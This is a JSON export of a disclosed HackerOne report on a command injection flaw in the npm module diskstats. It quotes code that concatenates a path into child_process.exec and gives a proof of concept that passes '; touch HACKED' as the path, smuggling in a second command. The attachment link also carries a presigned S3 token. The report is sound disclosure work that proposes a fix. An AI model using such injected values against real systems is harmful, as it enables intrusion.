{
  "id": 864354,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjQzNTQ=",
  "url": "https://hackerone.com/reports/864354",
  "title": "[diskstats] Command Injection via insecure command concatenation",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-01T19:55:01.641Z",
  "submitted_at": "2020-05-01T19:55:01.641Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3lla",
    "url": "/d3lla",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-07-23T19:11:05.993Z",
  "bug_reporter_agreed_on_going_public_at": "2020-07-23T19:11:05.923Z",
  "team_member_agreed_on_going_public_at": "2020-07-23T17:39:58.090Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `Command Injection` issue in the `diskstats` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `diskstats`\n**version:** `0.0.2`\n**npm page:** `https://www.npmjs.com/package/diskstats`\n\n## Module Description\n\nThis library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.\n\n## Module Stats\n\n[2] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44\n....\nstat.prototype._fetchSpace = function(path) {\n\treturn new Promise((resolve, reject) => {\n\t\tthis.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n\t\t\tif (err) {\n\t\t\t\treturn reject(err);\n\t\t\t}\t\t\t\n\n\t\t\treturn resolve(this._parseResponse(stdout));\n\t\t});\n\t});\n};\n\n// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56\nstat.prototype._fetchInodes = function(path) {\n\treturn new Promise((resolve, reject) => {\n\t\tthis.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection\n\t\t\tif (err) {\n\t\t\t\treturn reject(err);\n\t\t\t}\n\n\t\t\treturn resolve(this._parseResponse(stdout));\n\t\t});\n\t});\n};\n...\nmodule.exports = function(child_process, path) {\n\tif (!child_process) {\n\t\tchild_process = require('child_process');\n\t}\n\n\tif (!path) {\n\t\tpath = require('path');\n\t}\n\n\treturn new stat(child_process, path);\n}\n```\nThe `path` parameter is used to build the command that is passed to the `child_process.exec` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `diskstats` module:\n    -  `npm i diskstats`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst diskstats = require('diskstats');\ndiskstats.check('; touch HACKED', (err, results) => {});\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F811513}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `diskstats` module via insecure command concatenation.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 811513,
      "file_name": "poc_diskstats.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HCrDhRL8gQT7B2u4BuZKAV4w?response-content-disposition=attachment%3B%20filename%3D%22poc_diskstats.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_diskstats.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQSVZLPAM%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T094526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH8a3A9on%2BGiOVdpFJPD2Hw9fUC%2FpaGQ1ZmC4xSa83DuAiA5nUzvt4j%2FKksOUi81nlwCVqvTxwUDWygtrN%2Fun%2FwOpyqyBQgREAMaDDAxMzYxOTI3NDg0OSIM7Us3bIlZxTsT9SlDKo8FPCanq35bj3D3a6XCLafHIZfTYk22igGMfWnn4%2BD%2Bwkkcutn9zrqdhEnoJiaiG4vA5VSXqHv%2Fw5pHi36yo8YCRJxRurIRFbzNBihI1UbCr7J5LCMcqRHWQp1oMEyhtIeD65IpZCnHGBxr0o5gMFhKF%2FLkhYA1EmGI%2Bo36I2%2FpBvMFLTLQfQbFOieYOgu6Nt%2FyZSDfnbvVIDBmXx%2BNWH4kXh%2BZLG2fcD5xj2%2FVxNtvGV%2FwWwMt4F4DPsRsIxg1tMOfv5ogqDh18biThwLtCQKHbzN1TufNTqK5y3965ZYehapil5BtCPCxIgY4siX5lmMQcoTUbGx6sMiYu6zWCsgZslyq5mOj2vY0SVvykHaz1IHkQQISvyGyhwqfAg9HkNYCn1pKb%2Bub1So87LqSbqU4WKGeSohIwaGtdwREHltvG6B%2FDcmhrby5P5EQC3%2BmoVBIzhJFR3uMuLVPuzHV2aZV8DReQb3VShPBz5rlekYjxieu92x74cIR2wClKe5zcsFCpZllRVU4BTrYj1x2YnjltMbHXBYZrpBgocTAvSHc%2FfADjAkEKNwDEWFjJX3KJj2thM0pYCnvQKSRai1datrP4g9ZH8HoNk%2FnRqk5tb%2FnOxZtHK8YdgWCj1nHk6itb0qGsb%2FXP2LbwPFclTo2sRJPzSipYIpBDbcary91FfAGJAfiIaAPJ4xyfyCLKLBncg21N21uHEK9JAPwOtr%2B7xydkhr9PTkh7z7hKMJXv8tQB9vRKNoCD%2Beqa%2FDvk4%2BPJ%2FgQ9nnGvESHJ1XzmRe1fIpgPeNpK3L%2BYGdrOmV20EE5yEVwbLQGwhEOGOoiAOsOiwyouqusXDt4vlrlGFXl24gp9R6iEfeQ%2FK8LDBzmBO%2BuizCV2r7GBjqyAdeqpLf77IgVw35W%2BvJkbqGVZ1c1tmtVmQ5vl7l24zHtMX4zuaWpTpxmefDVxUiLCl%2B07feZP1SjNtFGiYQa192uiUbDKSFZhmK2jXvcF2dAnEP1RZqR%2FynOOkT5IQduT%2BC8MBpqiYteLNfa1k6f%2B%2FE7f5zGoJFEynTMES95NBg3SbEa%2FLL5G5CUmowzreGvQtqVTrKiwUNNKG8zbWQwW8rbZpZo5GdlkSY1N8caNOBeRmw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a75980fe69ff033b343fcbc6e80d11ee7e33d9aa19d587b820ee389f927a178c",
      "file_size": 894699,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-08-22T17:39:58.162Z",
  "allow_singular_disclosure_after": -160329928.16982087,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "bl4de",
    "l3ftr4ru"
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
